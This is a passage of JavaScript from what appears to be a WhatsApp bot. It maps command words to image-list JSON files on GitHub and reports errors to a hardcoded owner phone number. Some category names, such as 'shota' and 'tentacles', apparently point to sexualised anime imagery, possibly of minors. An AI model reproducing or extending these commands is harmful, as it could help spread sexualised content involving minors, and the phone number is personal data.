if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/tentacles.json')
if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/yumeko.json')
...
case 'jjmeryani':{
reply(mess.wait)
let kaydt = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/meryani.json')
...
let e = String(err)
kayla.sendMessage("6281574773972@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
